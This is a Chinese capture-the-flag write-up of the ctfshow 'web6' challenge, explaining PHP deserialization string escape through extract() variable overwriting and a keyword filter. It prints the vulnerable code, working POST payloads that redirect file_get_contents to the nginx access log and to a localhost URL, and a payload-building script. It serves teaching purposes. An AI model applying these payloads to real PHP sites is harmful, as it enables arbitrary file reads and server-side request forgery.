##  web6

考点：反序列化数组+字符串逃逸

这道题还是挺有意思的，首先看代码

```php
 <?php

error_reporting(0);
highlight_file(__FILE__);
$function = $_GET['POST'];

function filter($img){
    $filter_arr = array('ctfshow','daniu','happyhuyear');
    $filter = '/'.implode('|',$filter_arr).'/i';
    //implode函数是将数组元素变成字符串
    return preg_replace($filter,'',$img);
}

if($_SESSION){
    unset($_SESSION);
}

$_SESSION['function'] = $function;

extract($_POST['GET']);

$_SESSION['file'] = base64_encode("/root/flag");

$serialize_info = filter(serialize($_SESSION));

if($function == 'GET'){
    $userinfo = unserialize($serialize_info);
    //出题人已经拿过flag，题目正常,也就是说...
    echo file_get_contents(base64_decode($userinfo['file']));
} 
```

`extract`函数,是将一个数组中键名作为变量名，这儿就有一种类型题是变量覆盖（没有用到）

我们需要$function == 'GET'

```
?POST=GET
```

利用点就是`file_get_contents`获取文件内容

查看web服务器是nginx，和题目中文字提示，得知我们应该需要读取nginx日志文件`/var/log/nginx/access.log`

构造反序列化数组

```
GET[_SESSION][ctfshowdaniu]=s:1:";s:1:"1";s:4:"file";s:36:"L3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZw==";}
```

解释：因为是`extract($_POST['GET']);`，我们需要POST一个数组`GET[_SESSION][ctfshowdaniu]`,这样传进去就可以得到$_SESSION数组变量，ctfshowdaniu是数组变量中的一个键。

为什么需要ctfshowdaniu？

答：为了利用filter函数中的`str_replace`替换成空，变成字符串减少的字符串逃逸。

```php
$serialize_info为：
a:2:{s:12:"";s:70:"s:1:";s:1:"1";s:4:"file";s:36:"L3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZw==";}";s:4:"file";s:16:"L3Jvb3QvZmxhZw==";}
$userinfo 为：
array(2) {
  '";s:70:"s:1:' =>
  string(1) "1"
  'file' =>
  string(36) "L3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZw=="
}
```

`ctfshowdaniu`刚好12个字符，替换成空后，需要12个字符来填充--`";s:70:"s:1:`刚好12个字符，

payload中的`s:1:";s:1:"1"`中`s:1:`是完成前面12个字符的补充，后面的`";s:1:"1"`是为了补充完成一个键值对的反序列化格式。其中70个字符就是payload字符的70个。这样就达到一个字符的逃逸，让后面的`s:4:"file";s:16:"L3Jvb3QvZmxhZw==";`不起作用了。



构造payload代码

```php
<?php
$_SESSION['function'] = 'GET';
$_POST[_SESSION][ctfshowdaniu]='s:1:";s:1:"1";s:4:"file";s:36:"L3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZw==";}';
extract($_POST);
$_SESSION['file'] = base64_encode("/root/flag");
echo serialize($_SESSION).PHP_EOL;
```

为什么后面没有function？

因为`extract`函数处理`ctfshowdaniu`将数组变量的值`function`直接覆盖了。

![image-20220208114304688](https://img-blog.csdnimg.cn/img_convert/bbed607dd7cba0fd5a07046b46f27fbd.png)

然后再读取http://127.0.0.1/ctfshow

```
GET[_SESSION][ctfshowdaniu]=s:1:";s:1:"1";s:4:"file";s:32:"aHR0cDovLzEyNy4wLjAuMS9jdGZzaG93";}
```

